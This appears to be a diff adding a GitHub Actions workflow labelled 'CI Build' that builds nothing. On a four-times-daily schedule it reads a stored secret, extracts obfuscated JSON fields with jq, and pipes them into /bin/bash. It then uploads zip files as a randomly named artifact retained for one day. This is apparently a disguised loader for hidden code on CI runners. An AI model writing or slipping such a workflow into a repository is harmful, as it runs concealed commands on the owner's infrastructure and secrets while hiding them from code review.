@@ -1,0 +1,30 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '18 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          g2: ${{ secrets.g2 }}
+        run: |
+          printf '%s' "$g2" | jq -r .v40482 | /bin/bash
+          echo $k78120 | jq -r .akvo3 | /bin/bash
+          printf '%s' "$ljck730" | jq -r .jjwu385 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: LlwFyUHy
+          path: "*.zip"
+          retention-days: 1
